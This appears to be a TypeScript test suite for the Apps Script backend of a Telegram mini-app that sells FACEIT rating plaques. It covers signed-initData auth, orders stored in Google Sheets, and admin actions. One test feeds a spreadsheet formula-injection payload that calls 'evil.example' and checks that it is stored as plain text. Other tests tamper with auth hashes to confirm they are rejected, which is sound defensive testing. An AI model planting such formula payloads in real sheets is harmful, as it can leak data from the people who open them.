import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { calcPrice, type CreateOrderResponse, type MeResponse, type Order } from '@brorepack/shared'
import { BOT_PROPERTIES, BOT_TOKEN, DEV_PROPERTIES, WEBAPP_URL, createGas, orderInput, signInitData } from './harness'

const EXPECTED_HEADERS = [
  'id',
  '№',
  'статус',
  'создан',
  'оплачен',
  'обновлён',
  'Telegram id',
  'username',
  'имя',
  'FACEIT id',
  'ник FACEIT',
  'шаблон',
  'размер',
  'надпись',
  'подпись',
  'уровень',
  'ELO',
  'подсветка',
  'доставка',
  'город',
  'адрес',
  'координаты',
  'получатель',
  'телефон',
  'комментарий',
  'итого ₽',
  'расчёт',
  'трек-номер',
  'telegram charge id',
  'provider charge id',
]

describe('API: health, me, авторизация', () => {
  it('health без auth', () => {
    const { api } = createGas({ withSheet: false })
    assert.deepEqual(api('health'), { ok: true, data: { ok: true } })
  })

  it('me: dev:1 — админ при ADMIN_IDS=1, dev:2 — нет', () => {
    const { api } = createGas({ properties: DEV_PROPERTIES, withSheet: false })
    const admin = api<MeResponse>('me', undefined, 'dev:1')
    assert.deepEqual(admin, { ok: true, data: { user: { id: 1, firstName: 'Dev', username: 'dev' }, isAdmin: true } })
    assert.equal(api<MeResponse>('me', undefined, 'dev:2').data.isAdmin, false)
    // Префикс «tma », как в REST-заголовке, тоже принимается
    assert.equal(api<MeResponse>('me', undefined, 'tma dev:1').data.user.id, 1)
  })

  it('401 без auth и с dev:<id> при выключенном DEV_AUTH_BYPASS', () => {
    const { api } = createGas({ properties: { ...DEV_PROPERTIES, DEV_AUTH_BYPASS: '0', ...BOT_PROPERTIES }, withSheet: false })
    assert.deepEqual(api('me'), { ok: false, status: 401, error: 'unauthorized', message: 'Открой приложение из Telegram' })
    assert.equal(api('me', undefined, 'dev:1').status, 401)
    assert.equal(api('orders.list', undefined, '').status, 401)
  })

  it('настоящая initData: подпись BOT_TOKEN принимается, подделка и устаревшая — нет', () => {
    const { api } = createGas({ properties: { ADMIN_IDS: '5000000001', ...BOT_PROPERTIES }, withSheet: false })
    const user = { id: 5_000_000_001, first_name: 'Лёха', username: 'goodlifeee', language_code: 'ru' }
    const fields = {
      query_id: 'AAHdF6IQAAAAAN0XohDhrOrc',
      user: JSON.stringify(user),
      auth_date: String(Math.floor(Date.now() / 1000) - 60),
      signature: 'some-ed25519-signature',
    }
    const initData = signInitData(fields)

    const me = api<MeResponse>('me', undefined, initData)
    assert.deepEqual(me, { ok: true, data: { user: { id: 5_000_000_001, firstName: 'Лёха', username: 'goodlifeee' }, isAdmin: true } })

    const tamperedUser = new URLSearchParams(initData)
    tamperedUser.set('user', JSON.stringify({ ...user, id: 1 }))
    assert.equal(api('me', undefined, tamperedUser.toString()).status, 401)

    const tamperedHash = new URLSearchParams(initData)
    tamperedHash.set('hash', '0'.repeat(64))
    assert.equal(api('me', undefined, tamperedHash.toString()).status, 401)

    assert.equal(api('me', undefined, signInitData(fields, '987654321:another-token')).status, 401)

    const stale = signInitData({ ...fields, auth_date: String(Math.floor(Date.now() / 1000) - 25 * 60 * 60) })
    assert.equal(api('me', undefined, stale).status, 401)

    assert.equal(api('me', undefined, 'auth_date=1&user=%7B%7D&hash=%E0%A4%A').status, 401)
    // Регистр hex в hash не важен — как Buffer.from(hash, 'hex') в Node
    const upper = new URLSearchParams(initData)
    upper.set('hash', upper.get('hash')!.toUpperCase())
    assert.equal(api('me', undefined, upper.toString()).ok, true)
  })

  it('неизвестное действие и тело без action', () => {
    const { api, gas } = createGas({ withSheet: false })
    assert.deepEqual(api('orders.drop'), { ok: false, status: 404, error: 'not_found', message: 'Неизвестное действие' })
    assert.deepEqual(api('__proto__'), { ok: false, status: 404, error: 'not_found', message: 'Неизвестное действие' })
    const output = gas.doPost({ postData: { contents: '[1,2]' }, parameter: {} })
    assert.equal(JSON.parse(output.getContent()).error, 'bad_request')
  })
})

describe('API: FACEIT', () => {
  it('mock: goodlifeee, notfound, кривой ник', () => {
    const { api } = createGas({ properties: DEV_PROPERTIES, withSheet: false })
    assert.deepEqual(api('faceit.player', { nickname: 'goodlifeee' }, 'dev:7').data, {
      nickname: 'goodlifeee',
      playerId: '5f3c2a9e-8b1d-4c7a-9e2f-1a6b0d4c8e19',
      avatarUrl: null,
      country: 'ru',
      level: 9,
      elo: 1809,
      stats: { matches: 1248, winRate: 54, kd: 1.18, headshots: 47 },
      source: 'mock',
    })
    assert.deepEqual(api('faceit.player', { nickname: 'notfound' }, 'dev:7'), {
      ok: false,
      status: 404,
      error: 'player_not_found',
      message: 'Игрок с таким ником не найден на FACEIT',
    })
    assert.deepEqual(api('faceit.player', { nickname: 'плохой ник' }, 'dev:7'), {
      ok: false,
      status: 400,
      error: 'invalid_nickname',
      message: 'Ник FACEIT — латиница, цифры, «-» и «_»',
    })
    assert.equal(api('faceit.player', {}, 'dev:7').error, 'invalid_nickname')
  })

  it('mock совпадает с Node-бэкендом (createMockProfile из apps/server)', () => {
    const { api } = createGas({ properties: DEV_PROPERTIES, withSheet: false })
    // Снято с apps/server/src/faceit.ts → createMockProfile
    const expected = [
      { playerId: 'e6866050-0c72-b901-d866-296554d462ee', nickname: 's1mple', level: 10, elo: 2062, stats: { matches: 2395, winRate: 55, kd: 1.29, headshots: 57 }, source: 'mock' },
      { playerId: '367380e4-d5a7-f996-8a1c-51eb27f4b5a9', nickname: 'Ax1Le', level: 7, elo: 1402, stats: { matches: 2766, winRate: 52, kd: 1.11, headshots: 42 }, source: 'mock' },
      { playerId: '5082b957-d799-f656-be0c-73994647a8b7', nickname: 'donk', level: 7, elo: 1499, stats: { matches: 267, winRate: 53, kd: 1.13, headshots: 37 }, source: 'mock' },
    ]
    for (const profile of expected) {
      assert.deepEqual(api('faceit.player', { nickname: profile.nickname }, 'dev:7').data, { ...profile, avatarUrl: null, country: 'ru' })
    }
  })

  it('live: профиль + статистика, кэш 60 с, 404 и недоступность', () => {
    const { api, faceit } = createGas({
      properties: { ...DEV_PROPERTIES, FACEIT_MODE: 'live', FACEIT_API_KEY: 'faceit-test-key' },
      withSheet: false,
    })
    faceit!.players.set('s1mple', {
      player_id: 'p-1',
      nickname: 's1mple',
      avatar: 'https://cdn.faceit.com/a.png',
      country: 'UA',
      games: { cs2: { skill_level: 10, faceit_elo: '3200' } },
    })
    faceit!.stats.set('p-1', { lifetime: { Matches: '1500', 'Win Rate %': '58', 'Average K/D Ratio': '1,31', 'Average Headshots %': '41' } })
    faceit!.players.set('nocs', { player_id: 'p-2', nickname: 'nocs', games: {} })

    const profile = api('faceit.player', { nickname: 'S1MPLE' }, 'dev:7')
    assert.deepEqual(profile.data, {
      playerId: 'p-1',
      nickname: 's1mple',
      avatarUrl: 'https://cdn.faceit.com/a.png',
      country: 'ua',
      level: 10,
      elo: 3200,
      stats: { matches: 1500, winRate: 58, kd: 1.31, headshots: 41 },
      source: 'faceit',
    })
    assert.equal(faceit!.state.requests.length, 2)
    assert.match(faceit!.state.requests[0]!, /\/players\?nickname=S1MPLE&game=cs2$/)

    // Повтор в течение минуты — из CacheService, без запросов
    assert.deepEqual(api('faceit.player', { nickname: 's1mple' }, 'dev:7').data, profile.data)
    assert.equal(faceit!.state.requests.length, 2)

    assert.equal(api('faceit.player', { nickname: 'ghost' }, 'dev:7').error, 'player_not_found')
    assert.deepEqual(api('faceit.player', { nickname: 'nocs' }, 'dev:7'), {
      ok: false,
      status: 404,
      error: 'player_not_found',
      message: 'У игрока нет CS2 на FACEIT',
    })

    faceit!.state.down = true
    assert.deepEqual(api('faceit.player', { nickname: 'other' }, 'dev:7'), {
      ok: false,
      status: 502,
      error: 'faceit_unavailable',
      message: 'FACEIT не отвечает, попробуй чуть позже',
    })
  })
})

describe('API: заказы', () => {
  it('orders.create с кириллицей: строка в листе «Заказы» с русскими заголовками', () => {
    const { api, ordersSheet } = createGas({ properties: DEV_PROPERTIES })
    // level/elo с клиента игнорируются — берутся из FACEIT
    const input = orderInput({
      design: { ...orderInput().design, level: 1, elo: 100 },
      comment: '=IMPORTXML("https://evil.example","//a")',
    })
    const result = api<CreateOrderResponse>('orders.create', input, 'dev:7')
    assert.equal(result.ok, true, JSON.stringify(result))
    const { order, invoiceUrl, paymentMode } = result.data
    assert.equal(invoiceUrl, null)
    assert.equal(paymentMode, 'mock')
    assert.equal(order.id, 1)
    assert.equal(order.number, '1001')
    assert.equal(order.status, 'awaiting_payment')
    assert.deepEqual(order.design, {
      templateId: 'graphite',
      size: 'A5',
      displayName: 'Леха Гей',
      caption: 'for reaching 9 lvl 1809 elo',
      level: 9,
      elo: 1809,
    })
    assert.deepEqual(order.price, calcPrice({ templateId: 'graphite', size: 'A5', extras: { lightStand: true }, deliveryMethod: 'cdek_pvz' }))
    assert.deepEqual(order.customer, { telegramId: 7, username: 'dev', firstName: 'Dev' })
    assert.equal(order.comment, '=IMPORTXML("https://evil.example","//a")')
    assert.equal(order.recipient.phone, '+7 999 123-45-67')
    assert.equal(order.paidAt, null)
    assert.match(order.createdAt, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/)

    const sheet = ordersSheet()
    const [headers] = sheet.dump()
    assert.deepEqual(headers, EXPECTED_HEADERS)
    const [row] = sheet.records()
    assert.equal(row!['id'], 1)
    assert.equal(row!['№'], 1001)
    assert.equal(row!['статус'], 'awaiting_payment')
    assert.equal(row!['надпись'], 'Леха Гей')
    assert.equal(row!['ник FACEIT'], 'goodlifeee')
    assert.equal(row!['уровень'], 9)
    assert.equal(row!['ELO'], 1809)
    assert.equal(row!['подсветка'], 'да')
    assert.equal(row!['Telegram id'], 7)
    assert.equal(row!['город'], 'Москва')
    assert.equal(row!['координаты'], '55.757600, 37.613600')
    assert.deepEqual(order.delivery.location, { lat: 55.7576, lon: 37.6136 })
    // Текстовые ячейки остаются текстом: телефон не стал числом, дата — датой, «=…» — формулой
    assert.equal(row!['телефон'], '+7 999 123-45-67')
    assert.equal(typeof row!['создан'], 'string')
    assert.equal(row!['создан'], order.createdAt)
    assert.notEqual(row!['комментарий'], '#FORMULA')
    assert.equal(row!['итого ₽'], order.price.total)
    assert.deepEqual(JSON.parse(String(row!['расчёт'])), order.price.lines)

    // Второй заказ — следующий id
    const second = api<CreateOrderResponse>('orders.create', orderInput({ nickname: 'donk' }), 'dev:8')
    assert.equal(second.data.order.id, 2)
    assert.equal(second.data.order.design.level, 7)
  })

  it('orders.mockPay → paid, повтор → 409; list/get и доступ', () => {
    const { api } = createGas({ properties: DEV_PROPERTIES })
    const { order } = api<CreateOrderResponse>('orders.create', orderInput(), 'dev:7').data

    const paid = api<Order>('orders.mockPay', { id: order.id }, 'dev:7')
    assert.equal(paid.ok, true, JSON.stringify(paid))
    assert.equal(paid.data.status, 'paid')
    assert.ok(paid.data.paidAt)

    assert.deepEqual(api('orders.mockPay', { id: order.id }, 'dev:7'), {
      ok: false,
      status: 409,
      error: 'order_not_payable',
      message: 'Заказ уже оплачен или отменён',
    })

    const list = api<Order[]>('orders.list', undefined, 'dev:7')
    assert.deepEqual(
      list.data.map((item) => item.id),
      [order.id],
    )
    assert.equal(list.data[0]!.status, 'paid')
    assert.equal('telegramChargeId' in list.data[0]!, false)

    assert.equal(api<Order>('orders.get', { id: order.id }, 'dev:7').data.id, order.id)
    assert.deepEqual(list.data[0]!.delivery.location, { lat: 55.7576, lon: 37.6136 })
    assert.equal(api<Order>('orders.get', { id: String(order.id) }, 'dev:7').data.id, order.id)
    assert.deepEqual(api('orders.get', { id: order.id }, 'dev:2'), { ok: false, status: 403, error: 'forbidden', message: 'Это не твой заказ' })
    assert.equal(api<Order>('orders.get', { id: order.id }, 'dev:1').data.id, order.id, 'админ видит любой заказ')
    assert.deepEqual(api('orders.get', { id: 999 }, 'dev:7'), { ok: false, status: 404, error: 'not_found', message: 'Заказ не найден' })
    assert.equal(api('orders.get', { id: 'abc' }, 'dev:7').status, 404)
    assert.equal(api('orders.mockPay', { id: order.id }, 'dev:2').status, 403)
    assert.deepEqual(api<Order[]>('orders.list', undefined, 'dev:2').data, [])
  })

  it('orders.list: свои, новые сверху, без неоплаченных старше суток', () => {
    const { api, ordersSheet } = createGas({ properties: DEV_PROPERTIES })
    const first = api<CreateOrderResponse>('orders.create', orderInput(), 'dev:7').data.order
    const second = api<CreateOrderResponse>('orders.create', orderInput(), 'dev:7').data.order
    api('orders.create', orderInput(), 'dev:8')

    // Делаем первый заказ «позавчерашним» прямо в таблице
    const sheet = ordersSheet()
    const createdColumn = (sheet.dump()[0] as string[]).indexOf('создан') + 1
    sheet.getRange(2, createdColumn).setValue(new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString())

    assert.deepEqual(
      api<Order[]>('orders.list', undefined, 'dev:7').data.map((order) => order.id),
      [second.id],
    )
    // Оплаченный старый — снова виден
    api('orders.mockPay', { id: first.id }, 'dev:7')
    assert.deepEqual(
      api<Order[]>('orders.list', undefined, 'dev:7').data.map((order) => order.id),
      [second.id, first.id],
    )
  })

  it('orders.invoice: mock → invoiceUrl null; оплаченный → 409; PAYMENTS_MODE=telegram → mockPay 404', () => {
    const { api } = createGas({ properties: DEV_PROPERTIES })
    const { order } = api<CreateOrderResponse>('orders.create', orderInput(), 'dev:7').data
    assert.deepEqual(api('orders.invoice', { id: order.id }, 'dev:7'), { ok: true, data: { invoiceUrl: null, paymentMode: 'mock' } })
    api('orders.mockPay', { id: order.id }, 'dev:7')
    assert.equal(api('orders.invoice', { id: order.id }, 'dev:7').error, 'order_not_payable')

    const telegramGas = createGas({
      properties: { ...DEV_PROPERTIES, ...BOT_PROPERTIES, PAYMENTS_MODE: 'telegram', PAYMENT_PROVIDER_TOKEN: '381764678:TEST:123' },
    })
    const created = telegramGas.api<CreateOrderResponse>('orders.create', orderInput({ comment: 'Хочу ярче' }), 'dev:7')
    assert.equal(created.ok, true, JSON.stringify(created))
    assert.equal(created.data.paymentMode, 'telegram')
    assert.equal(created.data.invoiceUrl, `https://t.me/$invoice-test-${created.data.order.id}`)
    const [invoice] = telegramGas.telegram!.byMethod('createInvoiceLink')
    assert.deepEqual(invoice!.payload, {
      title: `Плашка BROREPACK №${created.data.order.number}`,
      description: 'Акриловая плашка FACEIT: Graphite, A5, «Леха Гей», с подсветкой, доставка: Пункт СДЭК',
      payload: String(created.data.order.id),
      provider_token: '381764678:TEST:123',
      currency: 'RUB',
      prices: created.data.order.price.lines.map((line) => ({ label: line.label, amount: line.amount * 100 })),
    })
    assert.equal(telegramGas.api('orders.mockPay', { id: created.data.order.id }, 'dev:7').status, 404)

    telegramGas.telegram!.failures.set('createInvoiceLink', { code: 400, description: 'Bad Request: PAYMENT_PROVIDER_INVALID' })
    assert.deepEqual(telegramGas.api('orders.invoice', { id: created.data.order.id }, 'dev:7'), {
      ok: false,
      status: 502,
      error: 'payment_unavailable',
      message: 'Не получилось создать счёт, попробуй ещё раз',
    })
  })

  it('адрес, введённый вручную: без города и координат, ячейка «координаты» пустая', () => {
    const { api, ordersSheet } = createGas({ properties: DEV_PROPERTIES })
    const delivery = { method: 'courier', city: '', address: 'Казань, Баумана, 1, кв. 5', location: null }
    const { order } = api<CreateOrderResponse>('orders.create', orderInput({ delivery }), 'dev:7').data

    assert.deepEqual(order.delivery, delivery)
    assert.equal(ordersSheet().records()[0]!['координаты'], '')
    assert.equal(api<Order>('orders.get', { id: order.id }, 'dev:7').data.delivery.location, null)
  })

  it('validation_error с issues по полям', () => {
    const { api } = createGas({ properties: DEV_PROPERTIES })
    const result = api(
      'orders.create',
      orderInput({ recipient: { name: 'Алексей', phone: '123' }, delivery: { method: 'cdek_pvz', city: '', address: 'ул', location: null } }),
      'dev:7',
    )
    assert.equal(result.ok, false)
    assert.equal(result.status, 400)
    assert.equal(result.error, 'validation_error')
    assert.deepEqual(
      result.issues?.map((issue) => issue.path).sort(),
      ['delivery.address', 'recipient.phone'],
    )
    assert.deepEqual(result.issues?.find((issue) => issue.path === 'recipient.phone')?.message, 'Проверь номер телефона')
    assert.deepEqual(result.issues?.find((issue) => issue.path === 'delivery.address')?.message, 'Укажи адрес или пункт выдачи')
    assert.equal(result.message, result.issues?.[0]?.message)

    assert.equal(api('orders.create', orderInput({ nickname: 'notfound' }), 'dev:7').error, 'player_not_found')
  })

  it('без таблицы — 500 internal_error, а не исключение', () => {
    const { api, env } = createGas({ properties: DEV_PROPERTIES, withSheet: false })
    assert.deepEqual(api('orders.list', undefined, 'dev:7'), {
      ok: false,
      status: 500,
      error: 'internal_error',
      message: 'Что-то пошло не так, попробуй ещё раз',
    })
    assert.ok(env.logs.some((entry) => entry.level === 'error' && /SPREADSHEET_ID/.test(entry.message)))
  })
})

describe('API: админка', () => {
  function seed() {
    const gas = createGas({ properties: { ...DEV_PROPERTIES, ...BOT_PROPERTIES } })
    const unpaid = gas.api<CreateOrderResponse>('orders.create', orderInput(), 'dev:7').data.order
    const paid = gas.api<CreateOrderResponse>('orders.create', orderInput({ nickname: 'donk' }), 'dev:7').data.order
    gas.api('orders.mockPay', { id: paid.id }, 'dev:7')
    gas.telegram!.clear()
    return { ...gas, unpaid, paid }
  }

  it('403 для не-админа', () => {
    const { api, paid } = seed()
    assert.deepEqual(api('admin.orders.list', {}, 'dev:2'), { ok: false, status: 403, error: 'forbidden', message: 'Только для администратора' })
    assert.equal(api('admin.orders.update', { id: paid.id, status: 'printing' }, 'dev:7').status, 403)
    assert.equal(api('admin.orders.list', {}).status, 401)
  })

  it('admin.orders.list: без status — всё кроме awaiting_payment; со status — фильтр', () => {
    const { api, paid, unpaid } = seed()
    assert.deepEqual(
      api<Order[]>('admin.orders.list', {}, 'dev:1').data.map((order) => order.id),
      [paid.id],
    )
    assert.deepEqual(
      api<Order[]>('admin.orders.list', undefined, 'dev:1').data.map((order) => order.id),
      [paid.id],
    )
    assert.deepEqual(
      api<Order[]>('admin.orders.list', { status: 'awaiting_payment' }, 'dev:1').data.map((order) => order.id),
      [unpaid.id],
    )
    const invalid = api('admin.orders.list', { status: 'lost' }, 'dev:1')
    assert.equal(invalid.error, 'validation_error')
    assert.equal(invalid.issues?.[0]?.path, 'status')
  })

  it('admin.orders.update: printing → shipped с трек-номером, клиенту уходят сообщения', () => {
    const { api, paid, telegram, ordersSheet } = seed()

    const printing = api<Order>('admin.orders.update', { id: paid.id, status: 'printing' }, 'dev:1')
    assert.equal(printing.ok, true, JSON.stringify(printing))
    assert.equal(printing.data.status, 'printing')
    let [message] = telegram!.byMethod('sendMessage')
    assert.equal(message!.payload.chat_id, 7)
    assert.equal(message!.payload.text, `Заказ №${paid.number} в печати. Как только плашка будет готова — отправим.`)
    assert.equal(message!.payload.parse_mode, 'HTML')
    assert.deepEqual(message!.payload.reply_markup, {
      inline_keyboard: [[{ text: 'Открыть заказ', web_app: { url: `${WEBAPP_URL}#/orders/${paid.id}` } }]],
    })

    telegram!.clear()
    const shipped = api<Order>('admin.orders.update', { id: String(paid.id), status: 'shipped', trackingNumber: ' 10234567890 ' }, 'dev:1')
    assert.equal(shipped.data.status, 'shipped')
    assert.equal(shipped.data.trackingNumber, '10234567890')
    ;[message] = telegram!.byMethod('sendMessage')
    assert.equal(message!.payload.text, `Заказ №${paid.number} отправлен! Трек-номер: <code>10234567890</code>`)

    // Трек-номер в таблице — текстом (ведущие нули и длина не теряются)
    const row = ordersSheet().records().find((record) => record['id'] === paid.id)!
    assert.equal(row['трек-номер'], '10234567890')
    assert.equal(row['статус'], 'shipped')

    // Тот же статус и трек — без сообщения
    telegram!.clear()
    api('admin.orders.update', { id: paid.id, status: 'shipped', trackingNumber: '10234567890' }, 'dev:1')
    assert.equal(telegram!.byMethod('sendMessage').length, 0)

    assert.deepEqual(api('admin.orders.update', { id: 999, status: 'paid' }, 'dev:1'), {
      ok: false,
      status: 404,
      error: 'not_found',
      message: 'Заказ не найден',
    })
    assert.equal(api('admin.orders.update', { id: paid.id, status: 'teleported' }, 'dev:1').error, 'validation_error')
  })

  it('уведомления без BOT_TOKEN не ломают смену статуса', () => {
    const { api, env } = createGas({ properties: DEV_PROPERTIES })
    const { order } = api<CreateOrderResponse>('orders.create', orderInput(), 'dev:7').data
    api('orders.mockPay', { id: order.id }, 'dev:7')
    const updated = api<Order>('admin.orders.update', { id: order.id, status: 'cancelled' }, 'dev:1')
    assert.equal(updated.data.status, 'cancelled')
    assert.ok(env.urlFetch.calls.every((call) => !call.url.includes('api.telegram.org')))
  })

  it('initData админа работает так же, как dev:1', () => {
    const { api } = createGas({ properties: { ADMIN_IDS: '42', ...BOT_PROPERTIES } })
    const initData = signInitData(
      { user: JSON.stringify({ id: 42, first_name: 'Админ' }), auth_date: String(Math.floor(Date.now() / 1000)) },
      BOT_TOKEN,
    )
    assert.deepEqual(api('admin.orders.list', {}, initData), { ok: true, data: [] })
  })
})

describe('API: рейтинг на плашке нельзя подделать', () => {
  it('уровень, ELO и подпись берутся из FACEIT, а не от клиента', () => {
    const { api } = createGas({ properties: { ...DEV_PROPERTIES } })
    const forged = orderInput({
      design: {
        templateId: 'graphite',
        size: 'A5',
        displayName: 'Леха Гей',
        caption: 'for reaching 10 lvl 3000 elo',
        level: 10,
        elo: 3000,
      },
    })
    const created = api<CreateOrderResponse>('orders.create', forged, 'dev:1')
    assert.equal(created.ok, true)
    const { design } = created.data.order
    assert.equal(design.level, 9)
    assert.equal(design.elo, 1809)
    assert.equal(design.caption, 'for reaching 9 lvl 1809 elo')
    assert.equal(design.displayName, 'Леха Гей')
  })

  it('формата A4 больше нет', () => {
    const { api } = createGas({ properties: { ...DEV_PROPERTIES } })
    const result = api('orders.create', orderInput({ design: { templateId: 'graphite', size: 'A4', displayName: 'Леха' } }), 'dev:1')
    assert.equal(result.ok, false)
    assert.equal(result.error, 'validation_error')
  })
})

describe('API: FACEIT без ключа', () => {
  it('понятная ошибка вместо internal_error', () => {
    const { api } = createGas({ properties: { ...DEV_PROPERTIES, FACEIT_MODE: 'live' } })
    const result = api('faceit.player', { nickname: 'goodlife' }, 'dev:1')
    assert.equal(result.ok, false)
    assert.equal(result.status, 503)
    assert.equal(result.error, 'faceit_not_configured')
    assert.match(result.message ?? '', /FACEIT_API_KEY/)
  })
})
